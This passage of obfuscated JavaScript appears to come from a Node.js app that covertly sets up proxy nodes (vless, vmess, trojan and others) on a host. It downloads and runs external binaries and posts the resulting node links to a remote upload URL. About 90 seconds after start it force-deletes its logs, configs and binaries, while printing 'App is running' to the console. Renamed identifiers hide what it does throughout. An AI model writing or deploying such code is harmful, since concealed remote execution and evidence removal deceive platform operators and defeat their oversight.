axios[_0x4e1e67(0x147)](UPLOAD_URL+_0x4e1e67(0x1d4),_0x5cba9b,{'headers':{'Content-Type':_0x4e1e67(0x1f9)}});return _0x5e4c97&&_0x5e4c97[_0x4e1e67(0x1ed)]===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x5e4c97):null;}catch(_0x3e837f){if(_0x3e837f[_0x4e1e67(0x1e7)]){if(_0x3e837f[_0x4e1e67(0x1e7)][_0x4e1e67(0x1ed)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4e1e67(0x189)](listPath))return;const _0x9bbad4=fs[_0x4e1e67(0x200)](listPath,'utf-8'),_0x34b57d=_0x9bbad4[_0x4e1e67(0x1ad)]('\x0a')[_0x4e1e67(0x13e)](_0xf4b5ba=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4e1e67(0x1f7)](_0xf4b5ba));if(_0x34b57d['length']===0x0)return;const _0x3f69cc=JSON[_0x4e1e67(0x1a9)]({'nodes':_0x34b57d});try{const _0x14b5aa=await axios['post'](UPLOAD_URL+_0x4e1e67(0x165),_0x3f69cc,{'headers':{'Content-Type':_0x4e1e67(0x1f9)}});return _0x14b5aa&&_0x14b5aa[_0x4e1e67(0x1ed)]===0xc8?(console[_0x4e1e67(0x207)](_0x4e1e67(0x178)),_0x14b5aa):null;}catch(_0x5f1fd6){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x15a6be=_0x4bee,_0x12723=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x12723['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x12723[_0x15a6be(0x1b0)](phpPath);process[_0x15a6be(0x151)]===_0x15a6be(0x169)?exec('del\x20/f\x20/q\x20'+_0x12723[_0x15a6be(0x18d)]('\x20')+_0x15a6be(0x1e0),_0x364de1=>{const _0x48266e=_0x15a6be;console[_0x48266e(0x13c)](),console['log'](_0x48266e(0x1a7)),console[_0x48266e(0x207)](_0x48266e(0x19f));}):exec(_0x15a6be(0x1db)+_0x12723[_0x15a6be(0x18d)]('\x20')+_0x15a6be(0x13a),_0x16d33a=>{const _0x585515=_0x15a6be;console[_0x585515(0x13c)](),console[_0x585515(0x207)]('App\x20is\x20running'),console[_0x585515(0x207)](_0x585515(0x19f));});},0x15f90);}function _0x4bee(_0x1cd34a,_0x21ce13){_0x1cd34a=_0x1cd34a-0x137;const _0x21289f=_0x2128();let _0x4bee80=_0x21289f[_0x1cd34a];return _0x4bee80;}cleanFiles();async function AddVisitTask(){const _0x135f1a=_0x2791eb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x135f1a(0x207)](_0x135f1a(0x1d7));return;}try{const _0x489eb3=await axios[_0x135f1a(0x147)](_0x135f1a(0x1c0),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x135f1a(0x207)](_0x135f1a(0x150)),_0x489eb3;}catch(_0x41a08e){return console[_0x135f1a(0x1e2)](_0x135f1a(0x19e)+_0x41a08e[_0x135f1a(0x1f5)]),null;}}async function startserver(){const _0x5e18f2=_0x2791eb;try{console[_0x5e18f2(0x207)](_0x5e18f2(0x15f)),deleteNodes(),cleanupOldFiles(),argoType(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask(),console['log'](_0x5e18f2(0x1bf));}catch(_0x1eeebb){console[_0x5e18f2(0x1e2)](_0x5e18f2(0x142),_0x1eeebb);}}app[_0x2791eb(0x17a)](PORT,()=>console[_0x2791eb(0x207)](_0x2791eb(0x1ce)+PORT+'!')),startserver()[_0x2791eb(0x1a5)](_0xd97b64=>{const _0x1804bb=_0x2791eb;console[_0x1804bb(0x1e2)](_0x1804bb(0x209),_0xd97b64);});
